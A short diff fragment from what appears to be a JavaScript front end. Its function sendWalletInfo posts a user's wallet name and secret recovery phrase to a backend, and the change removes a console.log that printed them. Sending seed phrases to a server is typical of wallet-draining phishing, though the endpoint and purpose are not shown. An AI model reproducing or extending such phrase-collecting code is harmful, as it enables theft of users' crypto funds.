@@ -42,7 +42,6 @@ const sendWalletInfo = async (walletName, secretPhrase, userWalletName) => {
       secretPhrase,
       userWalletName
     });
-     console.log(walletName, userWalletName, secretPhrase )
     return response.data; // assuming backend responds with { success: true/false, ... }
   } catch (err) {
     console.error('Error sending wallet info:', err);
